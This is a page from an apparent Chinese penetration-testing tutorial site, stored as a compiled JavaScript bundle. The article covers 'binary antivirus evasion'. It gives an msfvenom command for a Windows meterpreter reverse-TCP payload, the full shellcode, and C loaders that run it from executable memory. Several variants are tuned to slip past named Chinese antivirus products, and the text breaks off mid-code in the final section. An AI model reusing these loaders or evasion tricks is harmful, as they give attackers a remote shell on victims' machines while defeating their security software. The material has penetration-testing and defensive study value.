import{a as e,n as t,o as n,r,s as i,t as a}from"./app-CCLdf4zJ.js";import{t as o}from"./plugin-vue_export-helper-BDNMzG2s.js";var s=JSON.parse(`{"path":"/pentest/bypass/bin.html","title":"二进制免杀","lang":"zh-CN","frontmatter":{"description":"二进制免杀 DeeLMind 提示 二进制免杀最好基于源码免杀 病毒代码 火绒免杀 360 免杀 Q 管免杀 金山免杀 MSF生成无需免杀，本身就不杀 国内通杀","head":[["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"二进制免杀\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2026-03-11T05:49:26.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"DeeLMind\\",\\"url\\":\\"https://deelmind.com\\"}]}"],["meta",{"property":"og:url","content":"https://deelmind.com/pentest/bypass/bin.html"}],["meta",{"property":"og:site_name","content":"極客方舟"}],["meta",{"property":"og:title","content":"二进制免杀"}],["meta",{"property":"og:description","content":"二进制免杀 DeeLMind 提示 二进制免杀最好基于源码免杀 病毒代码 火绒免杀 360 免杀 Q 管免杀 金山免杀 MSF生成无需免杀，本身就不杀 国内通杀"}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2026-03-11T05:49:26.000Z"}],["meta",{"property":"article:modified_time","content":"2026-03-11T05:49:26.000Z"}]]},"git":{"createdTime":1734955114000,"updatedTime":1773208166000,"contributors":[{"name":"DeeLMind","username":"DeeLMind","email":"deelmind@gmail.com","commits":2,"url":"https://github.com/DeeLMind"}]},"readingTime":{"minutes":7.89,"words":2367},"filePathRelative":"pentest/bypass/bin.md","autoDesc":true}`),c={name:`bin.md`};function l(o,s,c,l,u,d){let f=i(`DocsAD`);return n(),t(`div`,null,[s[0]||=a(`h1`,{id:`二进制免杀`,tabindex:`-1`},[a(`a`,{class:`header-anchor`,href:`#二进制免杀`},[a(`span`,null,`二进制免杀`)])],-1),s[1]||=a(`div`,{class:`hint-container warning`},[a(`p`,{class:`hint-container-title`},`DeeLMind 提示`),a(`p`,null,`二进制免杀最好基于源码免杀`)],-1),e(f),s[2]||=r(`<h2 id="病毒代码" tabindex="-1"><a class="header-anchor" href="#病毒代码"><span>病毒代码</span></a></h2><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.21 lport=4444 -f c</span></span>
<span class="line"><span></span></span>
<span class="line"><span>unsigned char buf[] =</span></span>
<span class="line"><span>&quot;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52&quot;</span></span>
<span class="line"><span>&quot;\\x51\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x56\\x48&quot;</span></span>
<span class="line"><span>&quot;\\x8b\\x52\\x20\\x4d\\x31\\xc9\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a&quot;</span></span>
<span class="line"><span>&quot;\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&quot;\\x01\\xc1\\xe2\\xed\\x52\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&quot;\\x41\\x51\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\\x85\\x72\\x00\\x00\\x00\\x8b&quot;</span></span>
<span class="line"><span>&quot;\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x8b\\x48&quot;</span></span>
<span class="line"><span>&quot;\\x18\\x50\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x4d\\x31\\xc9\\x48&quot;</span></span>
<span class="line"><span>&quot;\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x48\\x31\\xc0\\xac\\x41\\xc1&quot;</span></span>
<span class="line"><span>&quot;\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45&quot;</span></span>
<span class="line"><span>&quot;\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b&quot;</span></span>
<span class="line"><span>&quot;\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01&quot;</span></span>
<span class="line"><span>&quot;\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48&quot;</span></span>
<span class="line"><span>&quot;\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9&quot;</span></span>
<span class="line"><span>&quot;\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\\x00&quot;</span></span>
<span class="line"><span>&quot;\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\\x89\\xe5&quot;</span></span>
<span class="line"><span>&quot;\\x49\\xbc\\x02\\x00\\x11\\x5c\\xc0\\xa8\\x01\\x15\\x41\\x54\\x49\\x89\\xe4&quot;</span></span>
<span class="line"><span>&quot;\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\x68&quot;</span></span>
<span class="line"><span>&quot;\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a&quot;</span></span>
<span class="line"><span>&quot;\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89&quot;</span></span>
<span class="line"><span>&quot;\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5&quot;</span></span>
<span class="line"><span>&quot;\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba&quot;</span></span>
<span class="line"><span>&quot;\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\x49\\xff\\xce\\x75\\xe5&quot;</span></span>
<span class="line"><span>&quot;\\xe8\\x93\\x00\\x00\\x00\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9&quot;</span></span>
<span class="line"><span>&quot;\\x6a\\x04\\x41\\x58\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5&quot;</span></span>
<span class="line"><span>&quot;\\x83\\xf8\\x00\\x7e\\x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41&quot;</span></span>
<span class="line"><span>&quot;\\x59\\x68\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41&quot;</span></span>
<span class="line"><span>&quot;\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31&quot;</span></span>
<span class="line"><span>&quot;\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8&quot;</span></span>
<span class="line"><span>&quot;\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x41\\x57\\x59\\x68\\x00\\x40&quot;</span></span>
<span class="line"><span>&quot;\\x00\\x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\xba\\x0b\\x2f\\x0f\\x30\\xff\\xd5&quot;</span></span>
<span class="line"><span>&quot;\\x57\\x59\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x49\\xff\\xce\\xe9\\x3c&quot;</span></span>
<span class="line"><span>&quot;\\xff\\xff\\xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\\x85\\xf6\\x75\\xb4\\x41&quot;</span></span>
<span class="line"><span>&quot;\\xff\\xe7\\x58\\x6a\\x00\\x59\\x49\\xc7\\xc2\\xf0\\xb5\\xa2\\x56\\xff\\xd5&quot;;</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>int main(int argc, char** argv) {</span></span>
<span class="line"><span>    void* exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span>    memcpy(exec, buf, sizeof(buf));</span></span>
<span class="line"><span>    ((void(*)())exec)();</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    return 0;</span></span>
<span class="line"><span>}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="火绒免杀" tabindex="-1"><a class="header-anchor" href="#火绒免杀"><span>火绒免杀</span></a></h2><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>void encrypt(char * buf) {</span></span>
<span class="line"><span>    char key = 0x1;</span></span>
<span class="line"><span>    buf[63] -= key;</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span>
<span class="line"><span>int main(int argc, char** argv) {</span></span>
<span class="line"><span>    encrypt((char*)buf);</span></span>
<span class="line"><span>    void* exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span>    memcpy(exec, buf, sizeof(buf));</span></span>
<span class="line"><span>    ((void(*)())exec)();</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    return 0;</span></span>
<span class="line"><span>}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_360-免杀" tabindex="-1"><a class="header-anchor" href="#_360-免杀"><span>360 免杀</span></a></h2><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>unsigned char buf[] =</span></span>
<span class="line"><span>&quot;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52&quot;</span></span>
<span class="line"><span>&quot;\\x51\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x56\\x48&quot;</span></span>
<span class="line"><span>&quot;\\x8b\\x52\\x20\\x4d\\x31\\xc9\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a&quot;</span></span>
<span class="line"><span>&quot;\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41&quot;</span></span>
<span class="line"><span>&quot;\\x01\\xc1\\xe2\\xed\\x52\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0&quot;</span></span>
<span class="line"><span>&quot;\\x41\\x51\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\\x85\\x72\\x00\\x00\\x00\\x8b&quot;</span></span>
<span class="line"><span>&quot;\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x8b\\x48&quot;</span></span>
<span class="line"><span>&quot;\\x18\\x50\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x4d\\x31\\xc9\\x48&quot;</span></span>
<span class="line"><span>&quot;\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x48\\x31\\xc0\\xac\\x41\\xc1&quot;</span></span>
<span class="line"><span>&quot;\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45&quot;</span></span>
<span class="line"><span>&quot;\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b&quot;</span></span>
<span class="line"><span>&quot;\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01&quot;</span></span>
<span class="line"><span>&quot;\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48&quot;</span></span>
<span class="line"><span>&quot;\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9&quot;</span></span>
<span class="line"><span>&quot;\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\\x00&quot;</span></span>
<span class="line"><span>&quot;\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\\x89\\xe5&quot;</span></span>
<span class="line"><span>&quot;\\x49\\xbc\\x02\\x00\\x11\\x5c\\xc0\\xa8\\x01\\x15\\x41\\x54\\x49\\x89\\xe4&quot;</span></span>
<span class="line"><span>&quot;\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\x68&quot;</span></span>
<span class="line"><span>&quot;\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a&quot;</span></span>
<span class="line"><span>&quot;\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89&quot;</span></span>
<span class="line"><span>&quot;\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5&quot;</span></span>
<span class="line"><span>&quot;\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba&quot;</span></span>
<span class="line"><span>&quot;\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\x49\\xff\\xce\\x75\\xe5&quot;</span></span>
<span class="line"><span>&quot;\\xe8\\x93\\x00\\x00\\x00\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9&quot;</span></span>
<span class="line"><span>&quot;\\x6a\\x04\\x41\\x58\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5&quot;</span></span>
<span class="line"><span>&quot;\\x83\\xf8\\x00\\x7e\\x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41&quot;</span></span>
<span class="line"><span>&quot;\\x59\\x68\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41&quot;</span></span>
<span class="line"><span>&quot;\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31&quot;</span></span>
<span class="line"><span>&quot;\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8&quot;;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>unsigned char end[] = &quot;\\x00\\x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\xba\\x0b\\x2f\\x0f\\x30\\xff\\xd5&quot;</span></span>
<span class="line"><span>&quot;\\x57\\x59\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x49\\xff\\xce\\xe9\\x3c&quot;</span></span>
<span class="line"><span>&quot;\\xff\\xff\\xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\\x85\\xf6\\x75\\xb4\\x41&quot;</span></span>
<span class="line"><span>&quot;\\xff\\xe7\\x58\\x6a\\x00\\x59\\x49\\xc7\\xc2\\xf0\\xb5\\xa2\\x56\\xff\\xd5&quot;;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>unsigned char bypass[] = &quot;\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x41\\x57\\x59\\x68\\x00\\x40&quot;;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>int main(int argc, char** argv) {</span></span>
<span class="line"><span>    printf(&quot;test&quot;);</span></span>
<span class="line"><span>    void* exec = VirtualAlloc(0, 510, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    memcpy(exec, buf, sizeof(buf));</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    char * exec1 = (char *)exec + sizeof(buf) - 1;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    memcpy((char *)exec1, bypass, sizeof(bypass));</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    char* exec2 = (char*)exec1 + sizeof(bypass) - 1;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    memcpy((char*)exec2, end, sizeof(end));</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    ((void(*)())exec)();</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    return 0;</span></span>
<span class="line"><span>}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="q-管免杀" tabindex="-1"><a class="header-anchor" href="#q-管免杀"><span>Q 管免杀</span></a></h2><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>unsigned char buf[] =</span></span>
<span class="line"><span>&quot;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52&quot;</span></span>
<span class="line"><span>&quot;\\x51\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x56\\x48&quot;</span></span>
<span class="line"><span>&quot;\\x8b\\x52\\x20\\x4d\\x31\\xc9\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a&quot;</span></span>
<span class="line"><span>&quot;\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41&quot;</span></span>
<span class="line"><span>&quot;\\x01\\xc1\\xe2\\xed\\x52\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0&quot;</span></span>
<span class="line"><span>&quot;\\x41\\x51\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f\\x85\\x72\\x00\\x00\\x00\\x8b&quot;</span></span>
<span class="line"><span>&quot;\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x8b\\x48&quot;</span></span>
<span class="line"><span>&quot;\\x18\\x50\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x4d\\x31\\xc9\\x48&quot;</span></span>
<span class="line"><span>&quot;\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x48\\x31\\xc0\\xac\\x41\\xc1&quot;</span></span>
<span class="line"><span>&quot;\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45&quot;</span></span>
<span class="line"><span>&quot;\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b&quot;</span></span>
<span class="line"><span>&quot;\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01&quot;</span></span>
<span class="line"><span>&quot;\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48&quot;</span></span>
<span class="line"><span>&quot;\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9&quot;</span></span>
<span class="line"><span>&quot;\\x4b\\xff\\xff\\xff\\x5d\\x49\\xbe\\x77\\x73\\x32\\x5f\\x33\\x32\\x00\\x00&quot;</span></span>
<span class="line"><span>&quot;\\x41\\x56\\x49\\x89\\xe6\\x48\\x81\\xec\\xa0\\x01\\x00\\x00\\x49\\x89\\xe5&quot;</span></span>
<span class="line"><span>&quot;\\x49\\xbc\\x02\\x00\\x11\\x5c\\xc0\\xa8\\x01\\x15\\x41\\x54\\x49\\x89\\xe4&quot;</span></span>
<span class="line"><span>&quot;\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x4c\\x89\\xea\\x68&quot;</span></span>
<span class="line"><span>&quot;\\x01\\x01\\x00\\x00\\x59\\x41\\xba\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a&quot;</span></span>
<span class="line"><span>&quot;\\x41\\x5e\\x50\\x50\\x4d\\x31\\xc9\\x4d\\x31\\xc0\\x48\\xff\\xc0\\x48\\x89&quot;</span></span>
<span class="line"><span>&quot;\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5&quot;</span></span>
<span class="line"><span>&quot;\\x48\\x89\\xc7\\x6a\\x10\\x41\\x58\\x4c\\x89\\xe2\\x48\\x89\\xf9\\x41\\xba&quot;</span></span>
<span class="line"><span>&quot;\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0a\\x49\\xff\\xce\\x75\\xe5&quot;</span></span>
<span class="line"><span>&quot;\\xe8\\x93\\x00\\x00\\x00\\x48\\x83\\xec\\x10\\x48\\x89\\xe2\\x4d\\x31\\xc9&quot;</span></span>
<span class="line"><span>&quot;\\x6a\\x04\\x41\\x58\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8\\x5f\\xff\\xd5&quot;</span></span>
<span class="line"><span>&quot;\\x83\\xf8\\x00\\x7e\\x55\\x48\\x83\\xc4\\x20\\x5e\\x89\\xf6\\x6a\\x40\\x41&quot;</span></span>
<span class="line"><span>&quot;\\x59\\x68\\x00\\x10\\x00\\x00\\x41\\x58\\x48\\x89\\xf2\\x48\\x31\\xc9\\x41&quot;</span></span>
<span class="line"><span>&quot;\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x89\\xc3\\x49\\x89\\xc7\\x4d\\x31&quot;</span></span>
<span class="line"><span>&quot;\\xc9\\x49\\x89\\xf0\\x48\\x89\\xda\\x48\\x89\\xf9\\x41\\xba\\x02\\xd9\\xc8&quot;;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>unsigned char end[] = &quot;\\x00\\x00\\x41\\x58\\x6a\\x00\\x5a\\x41\\xba\\x0b\\x2f\\x0f\\x30\\xff\\xd5&quot;</span></span>
<span class="line"><span>&quot;\\x57\\x59\\x41\\xba\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x49\\xff\\xce\\xe9\\x3c&quot;</span></span>
<span class="line"><span>&quot;\\xff\\xff\\xff\\x48\\x01\\xc3\\x48\\x29\\xc6\\x48\\x85\\xf6\\x75\\xb4\\x41&quot;</span></span>
<span class="line"><span>&quot;\\xff\\xe7\\x58\\x6a\\x00\\x59\\x49\\xc7\\xc2\\xf0\\xb5\\xa2\\x56\\xff\\xd5&quot;;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>unsigned char bypass[] = &quot;\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x41\\x57\\x59\\x68\\x00\\x40&quot;;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>int main(int argc, char** argv) {</span></span>
<span class="line"><span>    printf(&quot;test&quot;);</span></span>
<span class="line"><span>    void* exec = VirtualAlloc(0, 510, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    memcpy(exec, buf, sizeof(buf));</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    char * exec1 = (char *)exec + sizeof(buf) - 1;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    memcpy((char *)exec1, bypass, sizeof(bypass));</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    char* exec2 = (char*)exec1 + sizeof(bypass) - 1;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    memcpy((char*)exec2, end, sizeof(end));</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    ((void(*)())exec)();</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    return 0;</span></span>
<span class="line"><span>}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="金山免杀" tabindex="-1"><a class="header-anchor" href="#金山免杀"><span>金山免杀</span></a></h2><p><code>MSF生成无需免杀，本身就不杀</code></p><h2 id="国内通杀" tabindex="-1"><a class="header-anchor" href="#国内通杀"><span>国内通杀</span></a></h2><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#include &lt;iostream&gt;</span></span>
<span class="line"><span>#include&lt;Windows.h&gt;</span></span>
<span class="line"><span>#include&lt;string&gt;</span></span>
<span class="line"><span>#include &lt;stdio.h&gt;</span></span>
